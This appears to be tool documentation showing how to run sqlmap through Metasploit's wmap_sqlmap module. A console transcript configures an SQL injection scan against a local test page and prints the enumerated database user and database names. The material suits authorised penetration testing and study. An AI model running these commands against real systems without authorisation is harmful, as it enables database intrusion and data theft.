To use Metasploit's sqlmap auxiliary module launch msfconsole and follow
the example below.

Note that if you are willing to run Metasploit's sqlmap auxiliary module on
Metasploit Framework 3.0 or 3.1 you first need to copy wmap_sqlmap.rb to
your <msf3 root path>/modules/auxiliary/scanner/http/ folder then launch
msfconsole because this module has been officially integrated in Metasploit
from the release 3.2.

$ ./msfconsole

                _                  _       _ _
               | |                | |     (_) |
 _ __ ___   ___| |_ __ _ ___ _ __ | | ___  _| |_
| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __|
| | | | | |  __/ || (_| \__ \ |_) | | (_) | | |_
|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__|
                            | |
                            |_|


       =[ msf v3.2-testing
+ -- --=[ 308 exploits - 173 payloads
+ -- --=[ 20 encoders - 6 nops
       =[ 75 aux

msf > use auxiliary/scanner/http/wmap_sqlmap 
msf auxiliary(wmap_sqlmap) > set RHOSTS 192.168.1.121
RHOSTS => 192.168.1.121
msf auxiliary(wmap_sqlmap) > set PATH /sqlmap/mysql/get_int.php
PATH => /sqlmap/mysql/get_int.php
msf auxiliary(wmap_sqlmap) > set QUERY id=1
QUERY => id=1
msf auxiliary(wmap_sqlmap) > set OPTS '--dbs --current-user'
OPTS => --dbs --current-user
msf auxiliary(wmap_sqlmap) > set SQLMAP_PATH /home/inquis/software/sqlmap/trunk/sqlmap/sqlmap.py
msf auxiliary(wmap_sqlmap) > show options 

Module options:

   Name         Current Setting                                                 Required  Description                                          
   ----         ---------------                                                 --------  -----------                                          
   BATCH        true                                                            yes       Never ask for user input, use the default behaviour  
   BODY                                                                         no        The data string to be sent through POST              
   METHOD       GET                                                             yes       HTTP Method                                          
   OPTS         --dbs --current-user                                            no        The sqlmap options to use                            
   PATH         /sqlmap/mysql/get_int.php                                       yes       The path/file to test for SQL injection              
   Proxies                                                                      no        Use a proxy chain                                    
   QUERY        id=1                                                            no        HTTP GET query                                       
   RHOSTS       192.168.1.121                                                   yes       The target address range or CIDR identifier          
   RPORT        80                                                              yes       The target port                                      
   SQLMAP_PATH  /home/inquis/software/sqlmap/trunk/sqlmap/sqlmap.py             yes       The sqlmap >= 0.6.1 full path                        
   SSL          false                                                           no        Use SSL                                              
   THREADS      1                                                               yes       The number of concurrent threads                     
   VHOST                                                                        no        HTTP server virtual host                             

msf auxiliary(wmap_sqlmap) > run
[*] exec: /home/inquis/software/sqlmap/trunk/sqlmap/sqlmap.py -u 'http://192.168.1.121:80//sqlmap/mysql/get_int.php?id=1' --method GET --dbs --current-user --batch
SQLMAP: 
SQLMAP: sqlmap/0.6.1 coded by Bernardo Damele A. G. <bernardo.damele@gmail.com>
SQLMAP: and Daniele Bellucci <daniele.bellucci@gmail.com>
SQLMAP: 
SQLMAP: [*] starting at: 16:23:19
SQLMAP: 
SQLMAP: [16:23:20] [WARNING] User-Agent parameter 'User-Agent' is not dynamic
SQLMAP: back-end DBMS:  MySQL >= 5.0.0
SQLMAP: 
SQLMAP: current user:    'testuser@localhost'
SQLMAP: 
SQLMAP: available databases [3]:
SQLMAP: [*] information_schema
SQLMAP: [*] mysql
SQLMAP: [*] test
SQLMAP: 
SQLMAP: 
SQLMAP: [*] shutting down at: 16:23:21
SQLMAP: 
[*] Auxiliary module execution completed
msf auxiliary(wmap_sqlmap) > 
